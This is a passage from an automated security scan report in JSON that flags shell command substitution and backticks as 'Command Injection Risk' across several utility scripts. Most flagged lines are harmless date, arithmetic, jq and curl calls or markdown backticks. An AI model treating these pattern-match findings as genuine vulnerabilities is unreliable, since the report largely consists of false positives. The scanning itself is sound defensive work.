      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 713,
      "issue": "Command substitution in shell",
      "evidence": "content=$(generate_python_pytest \"$NAME\" \"$STYLE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 719,
      "issue": "Command substitution in shell",
      "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 725,
      "issue": "Command substitution in shell",
      "evidence": "content=$(generate_typescript_jest \"$NAME\" \"$STYLE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 728,
      "issue": "Command substitution in shell",
      "evidence": "content=$(generate_rust_tests \"$NAME\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 731,
      "issue": "Command substitution in shell",
      "evidence": "content=$(generate_go_tests \"$NAME\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 742,
      "issue": "Command substitution in shell",
      "evidence": "output_file=\"$OUTPUT_DIR/$(basename \"$content\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 751,
      "issue": "Command substitution in shell",
      "evidence": "template=$(generate_python_pytest \"$NAME\" \"$STYLE\" | tail -n +2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 754,
      "issue": "Command substitution in shell",
      "evidence": "template=$(generate_typescript_jest \"$NAME\" \"$STYLE\" | tail -n +2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 757,
      "issue": "Command substitution in shell",
      "evidence": "template=$(generate_rust_tests \"$NAME\" | tail -n +2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 760,
      "issue": "Command substitution in shell",
      "evidence": "template=$(generate_go_tests \"$NAME\" | tail -n +2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 156,
      "issue": "Command substitution in shell",
      "evidence": "start_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 159,
      "issue": "Command substitution in shell",
      "evidence": "response=$(curl -s -w \"\\n%{http_code}\" --max-time \"$TIMEOUT\" \"$url\" 2>/dev/null || echo -e \"\\n000\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 161,
      "issue": "Command substitution in shell",
      "evidence": "end_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 162,
      "issue": "Command substitution in shell",
      "evidence": "duration=$(( (end_time - start_time) / 1000000 )) # Convert to milliseconds",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 165,
      "issue": "Command substitution in shell",
      "evidence": "http_code=$(echo \"$response\" | tail -n 1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 167,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_REQUESTS=$((TOTAL_REQUESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 170,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_LATENCY=$((TOTAL_LATENCY + duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 183,
      "issue": "Command substitution in shell",
      "evidence": "TIMEOUTS=$((TIMEOUTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 184,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 186,
      "issue": "Command substitution in shell",
      "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|timeout|${duration}ms\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 190,
      "issue": "Command substitution in shell",
      "evidence": "SUCCESSFUL_REQUESTS=$((SUCCESSFUL_REQUESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 195,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 197,
      "issue": "Command substitution in shell",
      "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|server_error|${http_code}|${duration}ms\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 201,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 203,
      "issue": "Command substitution in shell",
      "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|client_error|${http_code}|${duration}ms\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 213,
      "issue": "Command substitution in shell",
      "evidence": "http_code=$(curl -s -o /dev/null -w \"%{http_code}\" --max-time \"$TIMEOUT\" \"$health_url\" 2>/dev/null || echo \"000\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 231,
      "issue": "Command substitution in shell",
      "evidence": "start_time=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 232,
      "issue": "Command substitution in shell",
      "evidence": "end_time=$((start_time + DURATION))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 247,
      "issue": "Command substitution in shell",
      "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 248,
      "issue": "Command substitution in shell",
      "evidence": "elapsed=$(($(date +%s) - start_time))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 260,
      "issue": "Command substitution in shell",
      "evidence": "concurrent_success=$((concurrent_success + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 262,
      "issue": "Command substitution in shell",
      "evidence": "concurrent_failed=$((concurrent_failed + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 267,
      "issue": "Command substitution in shell",
      "evidence": "if [[ $concurrent_failed -gt $((CONCURRENT_REQUESTS / 2)) ]]; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 271,
      "issue": "Command substitution in shell",
      "evidence": "downtime_start=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 280,
      "issue": "Command substitution in shell",
      "evidence": "downtime_end=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 281,
      "issue": "Command substitution in shell",
      "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 282,
      "issue": "Command substitution in shell",
      "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 295,
      "issue": "Command substitution in shell",
      "evidence": "downtime_end=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 296,
      "issue": "Command substitution in shell",
      "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 297,
      "issue": "Command substitution in shell",
      "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 314,
      "issue": "Command substitution in shell",
      "evidence": "avg_latency=$((TOTAL_LATENCY / TOTAL_REQUESTS))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 315,
      "issue": "Command substitution in shell",
      "evidence": "success_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($SUCCESSFUL_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 316,
      "issue": "Command substitution in shell",
      "evidence": "error_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($FAILED_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 317,
      "issue": "Command substitution in shell",
      "evidence": "timeout_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($TIMEOUTS / $TOTAL_REQUESTS) * 100}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 326,
      "issue": "Command substitution in shell",
      "evidence": "metrics=$(calculate_metrics)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 348,
      "issue": "Command substitution in shell",
      "evidence": "\"downtime_percentage\": $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\"),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 349,
      "issue": "Command substitution in shell",
      "evidence": "\"zero_downtime\": $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"true\"; else echo \"false\"; fi),",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 351,
      "issue": "Command substitution in shell",
      "evidence": "$(printf '    \"%s\"' \"${ERRORS[@]}\" | paste -sd ',' -)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 377,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  Percentage: $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\")%\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 378,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  Zero-downtime: $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"${GREEN}YES${NC}\"; else echo \"${RED}NO${NC}\"; fi)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 422,
      "issue": "Command substitution in shell",
      "evidence": "if [[ $(awk \"BEGIN {print ($error_rate > 1.0)}\") -eq 1 ]]; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
      "line_number": 483,
      "issue": "Command substitution in shell",
      "evidence": "elif [[ $DOWNTIME_SECONDS -gt 60 ]] || [[ $FAILED_REQUESTS -gt $((TOTAL_REQUESTS / 10)) ]]; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 120,
      "issue": "Command substitution in shell",
      "evidence": "**Date:** $(date -u +\"%Y-%m-%d %H:%M:%S UTC\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 280,
      "issue": "Backtick command execution",
      "evidence": "- [ ] Context managers for resource management (`with` statements)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 281,
      "issue": "Backtick command execution",
      "evidence": "- [ ] Exceptions used properly (not bare `except:`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 298,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `ruff check` passes",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 299,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `mypy` passes (if using type hints)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 300,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `bandit` security check passes",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 323,
      "issue": "Backtick command execution",
      "evidence": "- [ ] No `any` types (use unknown or proper types)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 338,
      "issue": "Backtick command execution",
      "evidence": "- [ ] No security vulnerabilities (`npm audit`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 347,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `cargo fmt` applied",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 348,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `cargo clippy` warnings addressed",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 385,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `gofmt` applied",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 386,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `go vet` passes",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 387,
      "issue": "Backtick command execution",
      "evidence": "- [ ] `golangci-lint` passes",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 392,
      "issue": "Backtick command execution",
      "evidence": "- [ ] Error handling explicit (no `_` without reason)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 405,
      "issue": "Backtick command execution",
      "evidence": "- [ ] Race detector passes (`go test -race`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 479,
      "issue": "Command substitution in shell",
      "evidence": "\"generated_at\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
      "line_number": 609,
      "issue": "Command substitution in shell",
      "evidence": "output=$(generate_checklist \"$PR_TYPE\" \"$LANGUAGE\" \"$OUTPUT_FORMAT\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 97,
      "issue": "Command substitution in shell",
      "evidence": "PLAN_FILE=\"tfplan-$(date +%s)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 170,
      "issue": "Command substitution in shell",
      "evidence": "\"timeGenerated\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 200,
      "issue": "Command substitution in shell",
      "evidence": "local type=$(echo \"$resource\" | jq -r '.type')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 201,
      "issue": "Command substitution in shell",
      "evidence": "local name=$(echo \"$resource\" | jq -r '.name')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 202,
      "issue": "Command substitution in shell",
      "evidence": "local instance_type=$(echo \"$resource\" | jq -r '.change.after.instance_type // empty')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 211,
      "issue": "Command substitution in shell",
      "evidence": "total_monthly=$(echo \"$total_monthly + $cost\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 218,
      "issue": "Command substitution in shell",
      "evidence": "--arg resources \"$(printf '%s,' \"${resources[@]}\" | sed 's/,$//')\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 228,
      "issue": "Command substitution in shell",
      "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 229,
      "issue": "Command substitution in shell",
      "evidence": "local monthly_diff=$(jq -r '.diffTotalMonthlyCost // \"0\"' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 230,
      "issue": "Command substitution in shell",
      "evidence": "local hourly_cost=$(jq -r '.totalHourlyCost' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 238,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Generated: $(date)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 244,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$monthly_diff > 0\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 265,
      "issue": "Command substitution in shell",
      "evidence": "local detected=$(jq -r '.summary.totalDetectedResources // 0' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 266,
      "issue": "Command substitution in shell",
      "evidence": "local supported=$(jq -r '.summary.totalSupportedResources // 0' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 267,
      "issue": "Command substitution in shell",
      "evidence": "local unsupported=$(jq -r '.summary.totalUnsupportedResources // 0' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "local threshold_amount=$(echo \"$BUDGET * $ALERT_THRESHOLD / 100\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 277,
      "issue": "Command substitution in shell",
      "evidence": "local monthly_int=$(echo \"$monthly_cost\" | cut -d. -f1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 304,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Total,,$( jq -r '.totalMonthlyCost' infracost.json),$( jq -r '.totalHourlyCost' infracost.json)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 314,
      "issue": "Command substitution in shell",
      "evidence": "local prev_cost=$(jq -r '.totalMonthlyCost' \"$COMPARE_FILE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 315,
      "issue": "Command substitution in shell",
      "evidence": "local curr_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 316,
      "issue": "Command substitution in shell",
      "evidence": "local diff=$(echo \"$curr_cost - $prev_cost\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 317,
      "issue": "Command substitution in shell",
      "evidence": "local pct_change=$(echo \"scale=2; ($diff / $prev_cost) * 100\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 327,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$diff > 0\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
